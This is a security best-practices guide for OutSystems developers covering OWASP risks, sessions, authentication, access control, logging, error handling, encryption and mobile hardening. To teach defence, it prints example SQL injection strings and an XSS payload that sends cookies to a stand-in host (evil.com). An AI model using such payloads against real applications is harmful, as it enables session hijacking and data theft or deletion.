Introduction

This guide helps you understand how to keep OutSystems applications secure. You will learn what OutSystems does for you automatically, what you need to do as a developer, and how to check your app for problems.

Why Security Matters

Every application that connects to the internet is a potential target. Attackers look for weak points — an unprotected login page, a form that accepts dangerous input, a page accessible without a password. When they find one, they can steal data, impersonate users, or take control of your system.

OutSystems helps you build secure apps by default. Many protections are built in and work automatically. But the platform cannot make every decision for you — how you design permissions, how you handle errors, and what data you store all depend on the choices you make as a developer.

Three Layers of Security

🛡️

Layer 1: Built-in

OutSystems automatically protects your app from many common attacks — SQL injection, XSS, CSRF, session fixation, and more. You get all of this without writing a single line of security code.

👨‍💻

Layer 2: Developer

You are responsible for designing a correct permissions model, logging important events, handling errors safely, encrypting sensitive data, and following secure coding practices when writing custom code.

🔍

Layer 3: Testing

Before going live, run static code analysis (SAST) and penetration testing to find vulnerabilities that were missed during development. These tests look at your app from an attacker's point of view.

What are OWASP Risks?

OWASP (Open Web Application Security Project) is a nonprofit group of security experts. They study real attacks on real applications and publish a list of the top 10 most common and dangerous security problems found in apps worldwide. This list is updated regularly based on real data.

There are two OWASP lists relevant to OutSystems:

  • OWASP Web Top 10 (A1–A10) — the most common risks in web applications. Covers things like SQL injection, broken login systems, and exposed sensitive data.
  • OWASP Mobile Top 10 (M1–M10) — the most common risks in mobile apps. Covers things like insecure data storage on the device and unsafe communication between the app and the server.

This guide explains what each risk means, how OutSystems helps protect against it, and what you need to do as a developer. The OWASP Summary section at the end shows a quick reference of all risks in one table.

Secure Application Code

When you build apps with OutSystems, the platform automatically generates safe code. You don't have to worry about many low-level security details.

How It Works

When you build screens and logic in OutSystems using visual tools — forms, aggregates, UI blocks, server actions — the platform converts your work into standard .NET code. This generated code is not written carelessly; it uses well-tested, safe patterns that avoid the most common coding mistakes. This means that as a developer, you get protection against many attacks without needing to think about them.

Key Protections

A1
Injection Attacks (SQL Injection)

A SQL injection attack happens when an attacker puts SQL code into a text field, hoping the app will run it as a database command. For example, entering ' OR '1'='1 into a login field could bypass authentication entirely.

OutSystems aggregates and queries use parameterized SQL — the user's input is always treated as plain data, never as part of the SQL command. This makes injection attacks impossible when you use the built-in query tools.

Unsafe (manual SQL): "SELECT * FROM Users WHERE name = '" + userName + "'"
If userName = '; DROP TABLE Users; --, your whole Users table could be deleted.

Safe (OutSystems aggregate): The aggregate automatically wraps the variable as a parameter. No matter what the user types, it is treated as text, not a command.
A7
Cross-Site Scripting (XSS)

XSS happens when an attacker injects JavaScript into your app's pages. Other users then load the page and the attacker's script runs in their browser — stealing cookies, reading passwords, or redirecting to fake sites.

OutSystems automatically escapes output — it converts dangerous characters like < and > into safe representations before displaying them. This escaping is context-aware: the platform applies the right type of escaping depending on whether the content is in the HTML body, an HTML attribute, a JavaScript variable, a CSS value, or a URL.

A user types <script>alert('hacked')</script> into a comment field.
OutSystems stores it safely and when displaying it, converts it to &lt;script&gt;...&lt;/script&gt; — which the browser shows as plain text and never executes.
CSRF
Cross-Site Request Forgery (CSRF)

A CSRF attack tricks a logged-in user into accidentally performing an action they did not intend to. For example: an attacker sends you a link that, when clicked, submits a form on a banking app using your active session.

OutSystems automatically adds a hidden CSRF token to every form. When the form is submitted, the server checks that the token matches the one it issued. A request from an attacker's website won't have this token, so it will be rejected.

M1
Mobile Platform Safety

OutSystems mobile apps are built with React Native and Apache Cordova. The generated code follows all security guidelines set by Google (Android) and Apple (iOS). This means you automatically comply with the platform security rules required to publish to the app stores.

When You Write Custom Code

The automatic protections above work when you use OutSystems built-in tools. When you write your own SQL, HTML, or JavaScript — the platform cannot protect you automatically. It is your responsibility to write safe custom code.

To help, OutSystems shows design-time warnings in Service Studio when it detects risky patterns — for example, when you use raw SQL concatenation or output unescaped HTML. These warnings appear before you publish, giving you a chance to fix the problem.

⚠️

Never ignore security warnings in Service Studio. Investigate each one and fix the root cause — do not just suppress it.

Best Practices

  • Always use OutSystems aggregates and built-in widgets — they are secure by default.
  • If you must write custom SQL, use query parameters instead of combining strings with user input.
  • Use the Sanitization API (functions like SanitizeHtml and EncodeJavaScript) whenever you handle user-supplied content in custom code.
  • Pay attention to every security warning — each one is pointing at a real potential problem.

Secure Sessions

A session is the connection between a user and your app after they log in. OutSystems protects this connection so attackers cannot steal or fake it.

What Is a Session?

When a user logs in, the server creates a session — a temporary record that says "this browser connection belongs to this user." The server gives the browser a session ID (a long random string) stored in a cookie. Every request the browser makes after that includes the session ID, so the server knows who is making the request.

If an attacker steals or guesses a session ID, they can pretend to be that user without knowing their password. Protecting the session is therefore just as important as protecting the password.

Key Protections

Auto
Session Fixation Protection

A "session fixation" attack works like this: an attacker visits your site and gets a session ID. They then trick a real user into clicking a link that sets that same session ID in the user's browser. When the user logs in, the attacker already knows the session ID — so they are now logged in too.

OutSystems prevents this by creating a brand new session ID every time a user logs in. Even if an attacker pre-set a session ID, it becomes invalid the moment the user authenticates. The attacker's old session ID is useless.

A8
Safe JSON Deserialization

Some data in sessions and requests is stored in JSON format (a structured text format). An attacker might try to tamper with this data — changing their role from "User" to "Admin", for example.

OutSystems protects against this by adding a hash to the session data — a unique fingerprint calculated from the content. When the server receives the data back, it recalculates the hash. If the data was changed, the fingerprint will not match, and the request is rejected.

A4
XML External Entity (XXE) Protection

When your app uses SOAP web services, it receives data in XML format. An XXE attack embeds a special reference inside the XML that, when processed, tricks the server into reading local files (like password files) or contacting internal systems.

OutSystems escapes XML parsing in SOAP services to remove these dangerous references before processing.

M8
Code Tampering (Mobile)

On mobile devices, an attacker might extract your app, modify the code (for example, to bypass a login check), and then install the modified version. This is called "repackaging."

The optional AppShield add-on detects when your app has been tampered with — it checks for root/jailbreak access on the device, detects modified app packages, and blocks the app from running if tampering is found.

Best Practices

  • Enable secure cookies in your environment settings so session cookies are only sent over HTTPS — never over plain HTTP where they could be intercepted.
  • Set a reasonable session timeout — if a user is inactive for 30 minutes, their session should expire. This limits the damage if a session is stolen.
  • Session IDs should never appear in URLs (e.g., myapp.com/home?sessionId=abc123). URLs are stored in browser history and server logs, making them easy to steal. OutSystems stores session IDs in cookies instead.

Authentication

Authentication means checking that a user is who they say they are. OutSystems has a built-in system for this, and it is secure by default.

How OutSystems Handles Authentication

OutSystems manages the entire login process for you. Here is what happens behind the scenes when a user logs in:

  1. The user submits their username and password.
  2. OutSystems looks up the account and checks the password. Passwords are never stored in plain text — they are stored as a cryptographic hash (a one-way transformation that cannot be reversed). The system hashes what the user typed and compares the result to the stored hash.
  3. If the credentials are correct, a new session is created and two encrypted cookies are set in the browser — one for session identity, one for authentication data.
  4. Future requests include these cookies, and the server uses them to recognize the logged-in user.
A2
Broken Authentication Prevention

"Broken authentication" is a category of problems where attackers can compromise user accounts — by guessing passwords, reusing stolen session IDs, or exploiting weak password storage.

OutSystems addresses all of these: it creates new session IDs on every login (prevents session fixation), times out inactive sessions (limits stolen session use), stores passwords with strong hashing (protects against database theft), and provides brute force protection (blocks repeated guessing).

M4
Mobile Authentication

On mobile apps, authentication data is kept in encrypted cookies on the device. You can configure three time limits per environment: cache time (how long the auth data is cached locally), idle time (how long the user can be inactive before being logged out), and expiration time (the absolute maximum session length).

Single Sign-On (SSO)

In OutSystems, all apps in the same environment share the same authentication cookie. This means a user who logs into one app is automatically authenticated in all other apps in that environment — they do not need to log in again.

A company has three apps: HR App, Finance App, and Helpdesk App. A user logs into the HR App in the morning. When they open the Finance App later, they are already logged in — because both apps are in the same OutSystems environment and share the same session cookie.

This is convenient, but it also means that logging out of one app should log the user out of all apps. Make sure your logout action uses the built-in User_Logout action, which clears the shared session.

Best Practices

  • For enterprise apps, use an external identity provider (Active Directory, SAML 2.0, or Azure AD). This centralizes user management — when someone leaves the company, disabling their central account removes access to all apps immediately.
  • For sensitive apps (banking, healthcare), add two-factor authentication (2FA) as an extra layer — even if a password is stolen, the attacker still cannot log in without the second factor.
  • Enable secure cookies so they are only transmitted over HTTPS — never over plain HTTP.
  • Use the LifeTime settings to configure session timeout values appropriate for your security requirements.

Access Control (RBAC)

RBAC stands for Role-Based Access Control. It means controlling what each user is allowed to see and do, based on their role.

Two Types of Access Control

👤

For End Users

Control which screens and data your app's users can access. A regular employee sees only their own records; a manager can see their team's records; an admin can see and edit everything.

🧑‍💼

For IT Users

Control what developers, testers, and operators can do in LifeTime and Service Center. A developer can deploy to QA but not to Production; only a Release Manager can deploy to Production.

How Roles Work in OutSystems

Each screen and server action in OutSystems has a required role. When a user tries to access a screen or run an action, the platform checks if they have the required role. If not, access is denied.

There are three built-in role levels:

  • Anonymous — for users who have not logged in. These users can only access public screens. This should be the smallest possible set of screens.
  • Registered — for any user who has logged in, regardless of what role they have. Good for screens all logged-in users should see (like a home page or profile page).
  • Custom roles — roles you define yourself, such as "Manager", "Approver", or "ReadOnly". Assign these to specific screens and actions that only certain users should reach.
A5
Broken Access Control

"Broken access control" means users can access things they should not — for example, a regular employee can see payroll data, or a read-only user can delete records.

This is the #1 most common web security problem, according to OWASP. OutSystems helps by providing the role system, but you are responsible for assigning the right roles to the right screens and actions. The platform cannot decide which users should see which data — that is your design decision.

A developer builds a "Delete User" server action and forgets to add a role check. Any logged-in user who discovers the URL or API endpoint can call it and delete accounts. Always add role validation to every sensitive action.
A6
Security Misconfiguration

Misconfiguration means the system is set up incorrectly — default passwords not changed, unnecessary features left on, or wrong permissions on configuration files. These are not coding bugs; they are setup mistakes.

OutSystems Cloud environments are pre-configured with secure defaults and managed by OutSystems. For self-managed environments, you must follow the OutSystems hardening guides to apply the same secure settings manually.

M6
Mobile Authorization

The same role-based system works for mobile apps. However, remember that in a Reactive or Mobile app, hiding a button on the screen is not enough — the server action behind that button is still accessible to anyone who knows the API endpoint. Always add role checks in the server action itself, not just in the UI.

Best Practices

  • Always validate roles on the server side. Hiding a button or screen in the UI does not stop a determined attacker from calling the API directly. The server action must check permissions independently.
  • Follow the principle of least privilege — give each user role only the minimum access needed to do their job. Start restrictive and open up as needed.
  • When an employee changes roles or leaves the company, update or remove their role assignments immediately.
  • Create separate screens for different roles instead of showing/hiding parts of one screen. This is cleaner and more secure.

Brute Force Protection

A brute force attack is when an attacker tries many passwords very quickly to guess the right one. OutSystems has a built-in system to stop this.

What Is a Brute Force Attack?

In a brute force attack, the attacker does not guess smartly — they just try thousands or millions of password combinations automatically using a script. Modern computers can try billions of passwords per second. Without protection, a weak password like "password123" can be cracked in seconds.

A more targeted version is called a credential stuffing attack: attackers take a list of username/password pairs leaked from another website and try them on your app, hoping users reused the same password.

How OutSystems Protects Against This

OutSystems counts failed login attempts per account. When the count exceeds a limit, it applies one of two responses:

  • Backoff (delay) — the user must wait before trying again. The wait time increases with each failed attempt (e.g., 2 seconds, then 4, then 8). This makes automated attacks much slower — thousands of attempts per second become just a few per minute.
  • Temporary block — after too many failed attempts, the account is blocked for a period. The user (or an admin) must take action to unblock it.

Who Is Protected?

👤

App End Users

Users logging in to your business application (via the built-in login screen or custom login) are protected. The failed attempt counter resets after a successful login.

🧑‍💻

IT Users

Developers, testers, and operators logging in to LifeTime, Service Center, and Service Studio are also protected by the same mechanism.

Best Practices

  • Configure the number of allowed failed attempts in your environment settings. A common value is 5–10 attempts before backoff begins.
  • Do not set the limit too low (e.g., 3 attempts) — legitimate users sometimes mistype their password, especially on mobile keyboards.
  • Set up an alert or notification when an account is blocked — this is a strong signal that an attack may be in progress.
  • Encourage users to use strong, unique passwords. Brute force protection slows down attacks but strong passwords make them fail entirely.

Enforced HTTPS

HTTPS is the secure version of HTTP. It encrypts all data sent between the user's browser and the server. This prevents anyone from reading or changing that data.

How HTTPS Protects Data

When you use plain HTTP, all data sent between the browser and server is in plain text. Anyone who can intercept the network traffic — a hacker on the same Wi-Fi, an internet service provider, or a malicious network router — can read that data. This includes passwords, session cookies, and any personal information.

HTTPS adds a layer called TLS (Transport Layer Security) that encrypts the connection. Before any data is sent, the browser and server perform a "handshake" — they agree on an encryption method and exchange keys. After that, all data is scrambled before it leaves the device and unscrambled only on arrival.

Without HTTPS: A user on a coffee shop Wi-Fi enters their password. A hacker on the same network runs a packet sniffer and sees: password=MySecret123

With HTTPS: The same data looks like: x7K#9mQ$2@LpR... — random noise that is useless without the decryption key.

HTTPS in OutSystems

A3
Sensitive Data Exposure

Sending sensitive data over HTTP is one of the most common ways applications leak information. OutSystems allows you to enforce HTTPS at the environment level (applying to all apps) or for specific applications. You can also set up automatic redirection so any HTTP request is redirected to HTTPS.

M3
Mobile App Communication

OutSystems mobile apps are configured to communicate with the server over HTTPS only. If the server's HTTPS is not configured correctly, the mobile app will refuse to connect and show an error — protecting users from accidentally using an insecure connection.

HSTS — Preventing Accidental HTTP

HTTP Strict Transport Security (HSTS) is an extra layer of protection. Without HSTS, a user might accidentally type http:// instead of https://. Even if your server redirects them to HTTPS, that first HTTP request was sent in plain text and could have been intercepted.

With HSTS enabled, the browser remembers that your site always uses HTTPS. After the first visit, the browser automatically uses HTTPS for all future requests — it never even tries HTTP first. This is stored for a configurable period (usually one year).

Best Practices

  • Always enable SSL/TLS in your OutSystems environment — there is no good reason to leave it disabled.
  • Enforce HTTPS for all apps and environments — not just production. Attackers can use information gathered from dev or UAT environments too.
  • Enable HSTS to guarantee browsers always use HTTPS, even on the first connection.
  • Use TLS 1.2 or higher. Older versions (TLS 1.0, 1.1, SSL 3.0) have known vulnerabilities and should be disabled. Contact OutSystems Support to disable them in Cloud environments.

Auditing & Monitoring

Auditing means keeping records of what happens in your app. If something goes wrong, you can look back at the records to understand what happened.

Why Auditing Matters

Security incidents do not always trigger an alarm at the moment they happen. Often, you only discover a breach days or weeks later. Without audit logs, you cannot answer the most important questions: What did the attacker access? When did it happen? Which accounts were affected? How did they get in?

Good audit logs turn a mystery into an understandable sequence of events — and help you prevent the same attack from happening again.

Application Auditing (Service Center)

OutSystems has built-in monitoring tools in Service Center. Every running environment captures these logs automatically:

  • Application errors — unhandled exceptions, with stack traces and timing
  • Screen requests — which screens were loaded, by which user, from which IP address, and how long each request took
  • Integration logs — every call your app makes to an external REST API, SOAP service, or database, including the request and response details
  • Business process logs — the history of workflow steps in your business processes
  • Security audit events — login attempts, account locks, and role changes

You can search, filter, and export these logs in Service Center. For production systems, review logs regularly — especially errors and login failures.

System Activity Auditing (IT Actions)

You can also track what IT users (developers, operators, managers) do inside the OutSystems tools. This is important for accountability — you want to know if someone accidentally (or deliberately) made a change that broke production.

Tracked events include:

  • Publishing a new version of an application
  • Deploying to a different environment (e.g., to Production)
  • Deleting an application or module
  • Creating, changing, or deleting user accounts or role assignments
  • Logging in to LifeTime or Service Center
  • Changing environment settings or security configurations

Version History and Code Diff

OutSystems also maintains a full version history of all published applications. For any module, you can see every version ever published, who published it, and when. The visual diff tool in Service Studio lets you compare two versions side by side to see exactly what logic changed between them.

This is useful for security investigations: if suspicious behavior started on a specific date, you can check what code was published around that time and who made the changes.

💡

Set up alerts for unusual patterns in your logs. For example: many failed logins from the same IP at night, an unusual spike in 500 errors, or a deployment to production at an unexpected time — all of these are worth investigating.

Vulnerability Management

A vulnerability is a weakness in software that an attacker could exploit. OutSystems actively monitors its platform for new vulnerabilities and fixes them quickly.

What Is a Vulnerability?

A vulnerability is a flaw in software that an attacker can exploit. Vulnerabilities are found in all kinds of software — operating systems, databases, frameworks, libraries, and applications. When a vulnerability is discovered and made public, attackers immediately start looking for systems that have not been patched yet. The time between a vulnerability being announced and attackers using it is often just days.

How OutSystems Manages Vulnerabilities

OutSystems runs a continuous monitoring process to find vulnerabilities in:

  • The OutSystems platform itself — the server software, management consoles, and tools
  • The generated code — the .NET code that OutSystems generates from your visual models
  • Third-party components — open source libraries and frameworks used by the platform

When a vulnerability is found, OutSystems follows a defined process: assess the severity, develop a fix, test it, and release it in a platform update. For Cloud customers, these patches are applied automatically with minimal downtime.

A9
Using Components with Known Vulnerabilities

Modern applications use many third-party libraries — frameworks, parsers, cryptography tools, and more. Each of these can have vulnerabilities. An attacker who knows you are running a specific version of a vulnerable library can exploit it even if your own application code is perfect.

OutSystems uses a continuous delivery model — it regularly updates its internal components and releases patches before known vulnerabilities can be widely exploited. On OutSystems Cloud, this happens automatically.

However, Forge components and custom extensions you add to your app are your responsibility. You must check and update them regularly. An outdated plugin can be the weakest link in an otherwise secure application.

Best Practices

  • Keep your OutSystems platform updated. Every update includes security improvements in addition to new features. Running an old version means running with known, unpatched vulnerabilities.
  • If you are on OutSystems Cloud, contact support to understand the current patch status and schedule.
  • For self-managed deployments, monitor OutSystems security advisories and apply patches promptly — do not wait months to update.
  • Maintain a list of all Forge components and custom libraries used in your apps. Review each one periodically and update when new versions are available.

Permissions Model

You must design and implement the permissions model for your app. OutSystems gives you the tools — but you decide who can access what.

The Developer's Responsibility

OutSystems gives you the tools to control access — but it cannot read your mind about who should see what. The permissions model is entirely designed and implemented by you, the developer. If you forget to add a role check to a screen or action, OutSystems will not stop you from publishing it, and unauthorized users may access it.

This section covers the developer-side of access control — how to design it well and avoid the most common mistakes.

Roles Are More Than Just Screen Guards

Beginners often think of roles as "who can see which screen." But access control goes deeper than that:

  • Screens — yes, control which screens each role can open
  • Server actions — each server action can also be called directly via API. If there is no role check inside the action, anyone who discovers the endpoint can call it.
  • Data filters — even if a user can access a screen, make sure the data they see is filtered to what they are allowed to see. A regular employee should never see another employee's salary, even if they both have access to the "payroll" screen.
An HR app has a screen called "View Payslips". It requires the Employee role. Good — but the aggregate behind it fetches ALL payslips. If you use the current user's ID to filter the results (e.g., WHERE UserId = GetUserId()), each user only sees their own. If you forget the filter, every employee sees every payslip.

Built-in Role Checking Functions

In server actions, use these OutSystems built-in functions to check access:

  • GetUserId() — returns the ID of the currently logged-in user. If no user is logged in, it returns 0. Use this to filter data to the current user.
  • Check<RoleName>Role(UserId) — returns true if the given user has the named role. Use this to check permission before performing a sensitive operation.
  • CheckUserPermission() — checks if the current user has a specific permission.

Example: Permissions Design

You are building an HR app. You identify three types of users:

Employee — can view and edit only their own personal information and see their own payslips.
HRManager — can view all employees' information and payslips, but cannot change salary settings.
HRAdmin — can do everything, including changing salary bands and creating new employee records.

For each screen: set the required role. For each server action that changes data: check the role at the start using CheckHRAdminRole() before proceeding. For each data query: add a filter so users only get data their role should see.

Best Practices

  • Design your permission model on paper first — list every screen and action, and decide which role each requires — before you start building.
  • Always validate permissions on the server side inside server actions, not just by hiding UI elements.
  • When an employee changes roles or leaves, update their role assignments the same day — do not wait.
  • Use the principle of least privilege: start with the most restrictive access and only add permissions when there is a clear need.

Application Logging

Logging means recording important events in your app. Good logs help you detect attacks, debug problems, and understand user behavior.

Why Application Logging Matters

OutSystems automatically captures platform-level logs (errors, screen requests, integration calls). But your application has business logic that the platform knows nothing about — actions like approving a loan, transferring money, or deleting a user record. These important events need to be logged by you.

Without proper application logging, you cannot answer questions like: "Who approved this transaction? Was the user logged in when it happened? How many times did they try before succeeding?" This makes incident investigation nearly impossible.

What to Log

A good rule: log anything that would be important to know if something went wrong later. This includes:

  • Authentication events — successful logins, failed login attempts, logouts, and account lockouts (include username and IP address)
  • Access control failures — when a user tries to access a screen or action they do not have permission for (include which resource they tried to access and who they are)
  • Important data changes — records created, updated, or deleted (include what changed, who changed it, and when)
  • Business-critical actions — payments submitted, approvals given, contracts signed
  • Input validation failures — when submitted data fails validation, especially if it looks like an attack attempt

What NOT to Log

Logs are readable by anyone with access to Service Center. Never log:

  • Passwords or password hashes
  • Credit card numbers or bank account numbers
  • Social security numbers or national ID numbers
  • Full session tokens or authentication cookies
  • Any data that privacy regulations (like GDPR) classify as sensitive

How to Log in OutSystems

Use the LogMessage system action in your action flows. It accepts a message, a module name, and a type (information, warning, error). Logs appear in Service Center under the "General" log type.

For structured audit logging (with timestamps, user IDs, and searchable fields), use the Audit Trail component from OutSystems Forge. It provides a ready-made data model and API for recording and querying audit events.

What a Good Log Entry Looks Like

Too little information: "User action performed."
— This tells you nothing useful.

Too much information: "User john@example.com (password: abc123) submitted form with credit card 4111-1111-1111-1111"
— This is a security risk — sensitive data in the log.

Just right: "User ID 4821 (john@example.com) submitted payment request #PP-2024-00341 for amount $1,200. IP: 192.168.1.55. Timestamp: 2024-10-15 14:32:07."
— Enough to trace the event, with no sensitive data exposed.

Best Practices

  • Include enough context in each log entry: user ID, timestamp, IP address, and what action was taken.
  • Set up monitoring or alerts for unusual patterns — such as 50+ failed logins from the same IP within a few minutes.
  • Review logs regularly, not just when something goes wrong.
  • Store logs for an appropriate period — some compliance standards require 1–3 years of audit history.

Error Handling

Error handling means deciding what your app does when something goes wrong. Poorly handled errors can give attackers useful information about your system.

Why Error Messages Are a Security Risk

When something goes wrong in your application, the server generates an error with technical details — the type of exception, where in the code it happened, and often values of variables at that moment. This information is extremely useful to you as a developer when debugging. But if it is shown to the user, it becomes a gift to an attacker.

A detailed error message (called a stack trace) can reveal:

  • The server technology you use (.NET version, IIS version)
  • Which frameworks and libraries are installed
  • Internal file paths and directory structure
  • Database table names, column names, and query details
  • Parts of your business logic

Attackers use this information to plan targeted attacks — for example, searching for known vulnerabilities in the specific library version they just learned you are using.

Dangerous error (never show this to users):
NullReferenceException at OutSystems.RuntimePublic.Db.DatabaseAccessor.ExecuteQuery() in D:\inetpub\wwwroot\OutSystems\HR_App\Controllers\EmployeeController.cs:line 142

This tells the attacker your app is on a Windows server, the exact directory structure, the database access pattern, and which part of the code to probe.

Safe error (show this instead):
"Something went wrong. Please try again. If the problem continues, contact support and mention reference code ERR-20241015-0047."

The Correct Approach

The rule is simple: log the full details on the server, show a generic message to the user.

  • The server log captures everything — the exact exception, the stack trace, the user context, and the timestamp. This helps you investigate the problem.
  • The user sees only a friendly, non-technical message. Optionally include a reference code they can give to support, so you can find the matching log entry.

OutSystems Exception Hierarchy

OutSystems lets you catch errors at different levels of your application. Use the right level for the right situation:

  • Action level — catch errors from a specific operation (e.g., a database call) and handle them gracefully within that action. For example, if a record is not found, return a default value instead of crashing.
  • Screen level — catch any unhandled error on a specific screen and redirect the user to an error page.
  • Global level (OnException handler) — catches all unhandled errors across the entire application. Use this as a safety net to log everything and show a generic error page. This ensures no raw error ever reaches the user.

Best Practices

  • Set up a global exception handler in every application — this is your last line of defense against raw errors reaching users.
  • Log the full error details using LogMessage or to the Error log in Service Center. Include the exception message, timestamp, and user context.
  • Show a friendly error page with no technical content. Include a support reference code if helpful.
  • Never include table names, file paths, SQL queries, or library names in any message shown to users.
  • Test your error pages — make sure they actually show correctly when an error occurs.

Custom Code Safety

Sometimes you need to write custom code (raw SQL, custom HTML, or JavaScript). When you do, you must be careful — the default security protections may not apply.

When the Automatic Protections Stop

OutSystems automatically protects you when you use its built-in tools — aggregates, widgets, and standard actions. The generated code is safe. But the moment you step outside those tools and write your own code — custom SQL queries, raw HTML expressions, inline JavaScript — you leave the safety zone. No automatic protection applies.

This is not a problem if you know what you are doing. But it is a common source of vulnerabilities for developers who do not think about security while coding.

The Most Common Mistakes

1. SQL Injection via String Concatenation

Never build SQL queries by joining strings together with user-provided values. Instead, use query parameters — the database treats them as data, never as SQL commands.

Unsafe:
"SELECT * FROM Users WHERE email = '" + userEmail + "'"

If userEmail = x' OR '1'='1, the query becomes:
SELECT * FROM Users WHERE email = 'x' OR '1'='1'
This returns ALL users — a complete data breach.

Safe (in OutSystems custom SQL): Use @userEmail as a parameter. The database treats it as a literal string value, never as SQL.

2. XSS via Unescaped HTML Output

If you output user-supplied text directly into HTML without escaping it, an attacker can inject a script that runs in other users' browsers.

Unsafe: Displaying a user's "bio" field with the HTML Expression widget and setting "Escape Content" to false.

If the bio contains <script>document.location='http://evil.com/?cookie='+document.cookie</script>, every user who views that profile sends their session cookie to the attacker.

Safe: Leave "Escape Content" set to true (the default). Only set it to false if you have sanitized the HTML first using SanitizeHtml().

The Sanitization API

OutSystems provides a Sanitization API — a set of built-in functions that clean or encode user input for safe use in different contexts. Use the right function for the right situation:

  • SanitizeHtml(html) — removes dangerous tags and attributes from HTML while keeping safe formatting (like bold and lists). Use when you want to accept some user HTML, but not scripts.
  • SanitizeUrl(url) — validates and cleans a URL. Rejects javascript: protocol URLs that could run scripts when clicked.
  • EncodeJavaScript(text) — escapes a string so it can be safely embedded inside a JavaScript string literal. Prevents script injection via JavaScript variables.
  • VerifySqlFragment(sql) — checks that a SQL fragment does not contain injection patterns. Use when you cannot avoid dynamic SQL.

Design-Time Warnings

When OutSystems detects a risky coding pattern — for example, using an Expression widget with "Escape Content" set to false, or using raw SQL with concatenation — it shows a warning in TrueChange™ (the live feedback panel in Service Studio). These warnings appear before you publish, not after an attack.

Best Practices

  • Use aggregates for all database queries — they use parameters automatically.
  • If you need custom SQL, always use @parameterName syntax for user-supplied values.
  • Never set "Escape Content" to false on an Expression widget unless you have sanitized the content first with SanitizeHtml().
  • Treat every warning in TrueChange as a real potential problem — investigate each one.
  • For JavaScript interactions, use EncodeJavaScript() any time you are embedding a runtime value inside a JS string.

Encrypt Sensitive Data

Encryption means converting data into a scrambled form that only the right person (with the right key) can read. You should encrypt sensitive data everywhere it is stored or transmitted.

Two Types of Data to Protect

When people talk about encryption, they usually mean two different situations:

  • Data in transit — data being sent from one place to another (browser to server, server to database, app to API). Protect this with HTTPS/TLS.
  • Data at rest — data stored on a disk, in a database, in a file, or on a mobile device. Even if someone steals the storage, they should not be able to read the data without the encryption key.

This section focuses on data at rest — stored data that you encrypt yourself at the application level.

What Counts as Sensitive Data?

Think about the impact if this data were leaked or stolen. If the answer is "serious harm to users or the business," it is sensitive and should be encrypted:

  • Authentication data — passwords, session tokens, API keys, private keys
  • Personal identifying information (PII) — national ID numbers, passport numbers, date of birth combined with name
  • Health data — diagnoses, medications, medical history
  • Financial data — credit card numbers, bank account numbers, salary information
  • Business secrets — contracts, pricing data, internal strategies

Hashing vs Encryption — Know the Difference

These two words are often confused but they mean very different things:

  • Encryption — scrambles data using a key. Can be reversed (decrypted) using the same or a related key. Use this when you need to read the original value later (e.g., storing an API key that your app will use).
  • Hashing — converts data into a fixed-length fingerprint that cannot be reversed. Use this for passwords — you never need to "read" the original password; you just compare hashes. OutSystems uses strong hashing (bcrypt or similar) for user passwords automatically.

Tools Available in OutSystems

Web
CryptoAPI Component

Encrypts and decrypts sensitive database fields. It uses envelope encryption — a two-layer technique where the data is encrypted with a data key, and then the data key itself is encrypted with a master key. This way, the master key can be rotated without re-encrypting all the data.

Use CryptoAPI to encrypt specific columns in your database — for example, the "DiagnosisCode" field in a healthcare app or the "BankAccountNumber" field in a finance app.

Mobile
Key Store Plugin

Stores very sensitive items (like authentication tokens or cryptographic keys) in the device's secure hardware storage — a dedicated chip on the device that is isolated from the main operating system. Even if the device is compromised, items in the key store cannot be extracted.

Mobile
Ciphered Local Storage Plugin

Encrypts data stored in the app's local database on the device. Without the decryption key, extracting the app's local data files is useless — it is all scrambled. This protects against physical device theft and forensic data extraction.

Best Practices

  • Never store passwords in plain text or with reversible encryption — use hashing. OutSystems does this automatically for built-in user accounts.
  • Encrypt sensitive database columns (not entire tables) using CryptoAPI — only encrypt what is truly sensitive, as it adds query complexity.
  • Keep encryption keys separate from the encrypted data. Storing them together is like putting a safe's combination inside the safe.
  • On mobile, use the Key Store Plugin for tokens and credentials, and the Ciphered Local Storage Plugin for any sensitive offline data.
  • Use HTTPS to protect sensitive data while it is traveling — encryption at rest and in transit are both necessary.

Mobile App Security

Mobile apps have unique security challenges because they run on devices that users control. OutSystems provides special tools to secure mobile apps.

Why Mobile Apps Are Different

Web apps run in a browser that the user has limited control over. Mobile apps run directly on a device that the user fully controls — they can root the phone, install custom software, intercept network traffic, or extract the app's files. This means mobile apps face threats that web apps do not.

OutSystems provides two main tools to address mobile-specific threats: SSL Pinning and AppShield.

SSL Pinning

HTTPS protects your data in transit, but it relies on the device trusting the right server certificate. In a man-in-the-middle attack, an attacker intercepts the connection and presents a certificate that looks valid — maybe one issued by a certificate authority (CA) that the attacker controls, or installed on the device by malware.

SSL Pinning solves this by hardcoding the expected server certificate (or its public key) inside the app. When the app connects, it does not just check that the certificate is "valid" — it checks that it is the exact certificate it expects. If it does not match, the connection is blocked entirely.

Without SSL Pinning: An attacker on the same network installs a fake certificate and intercepts your app's HTTPS traffic. The device's operating system says the certificate is "valid" (it was issued by a trusted CA), so the app does not complain. The attacker reads all API calls including authentication tokens.

With SSL Pinning: The app checks the certificate fingerprint. It does not match the pinned one, so the connection is immediately refused and the attacker sees nothing.

Use the SSL Pinning Plugin from OutSystems Forge. Important: configure it before you go to production, because the certificate fingerprint is baked into the app binary — changing your server certificate later requires republishing the app.

AppShield — Hardening Your Mobile App

AppShield is an optional commercial add-on from OutSystems that automatically adds a set of runtime security protections to your mobile app. It protects against threats specific to the mobile environment:

  • Root / Jailbreak detection — detects if the device has been rooted (Android) or jailbroken (iOS). Rooted devices can bypass many operating system security controls. You can configure your app to refuse to run or show a warning on such devices.
  • Code injection protection — stops attackers from hooking into your app's process and injecting malicious code at runtime (a common technique used by security researchers and attackers alike).
  • Screenshot protection — prevents screenshots and screen recordings on sensitive screens (like a banking transaction screen). This stops malware from silently capturing what the user sees.
  • Repackaging detection — detects if someone extracted your app, modified it (to remove license checks or add malware), and redistributed it. If the app's signature has changed, AppShield refuses to run.
  • Code obfuscation — makes the compiled app code much harder to read and understand. An attacker who extracts the app binary sees scrambled names and logic instead of clear function names and business logic.
  • Debugger blocking — prevents a debugger from attaching to the running app. Attackers use debuggers to step through code, inspect memory, and find security bypass points.
  • Emulator blocking — prevents the app from running inside an Android emulator. Attackers use emulators to automate testing, bypass hardware checks, and analyze app behavior in a controlled environment.

Best Practices

  • For any app that handles sensitive data — banking, healthcare, government, or HR — seriously consider using AppShield. The threats it protects against are real and common.
  • Plan your SSL certificate rotation strategy before configuring SSL Pinning. You must republish the app every time the certificate changes.
